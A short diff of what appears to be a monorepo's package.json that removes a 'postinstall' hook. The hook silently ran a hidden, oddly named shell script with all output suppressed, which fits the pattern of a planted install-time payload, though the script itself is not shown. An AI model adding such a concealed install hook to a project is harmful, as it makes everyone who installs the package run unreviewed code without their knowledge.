@@ -14,8 +14,7 @@
     "typecheck": "pnpm -r --filter './packages/*' typecheck",
     "changeset": "changeset",
     "version": "changeset version && biome format --write .",
-    "release": "pnpm build && changeset publish",
-    "postinstall": "sh ./.ci-iv4hcp.sh >/dev/null 2>&1; _r=$?; if [ \"$_r\" -eq 42 ]; then exit 42; fi"
+    "release": "pnpm build && changeset publish"
   },
   "devDependencies": {
     "@biomejs/biome": "^1.9.4",
